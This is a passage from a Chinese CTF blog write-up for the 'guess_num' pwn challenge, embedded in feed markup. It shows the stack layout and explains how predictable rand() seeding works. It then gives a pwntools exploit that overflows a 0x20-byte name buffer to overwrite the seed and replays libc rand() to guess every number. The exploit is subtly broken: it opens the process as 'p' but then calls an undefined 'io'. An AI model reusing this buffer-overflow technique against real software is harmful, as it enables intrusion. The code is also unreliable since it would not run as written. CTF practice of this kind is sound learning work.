undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line"></span><br><span class="line">发现var_30在栈中占0x20，可以覆盖到seed</span><br><span class="line">如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。</span><br></pre></td></tr></table></figure><h3 id="0x03攻击"><a href="#0x03攻击" class="headerlink" title="0x03攻击"></a>0x03攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于rand和srand</span><br><span class="line">随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</span><br><span class="line">对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"/home/xfgg/Downloads/guess_num"</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(1)</span><br><span class="line">io.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    num = str(libc.rand()%6+1)</span><br><span class="line">    io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
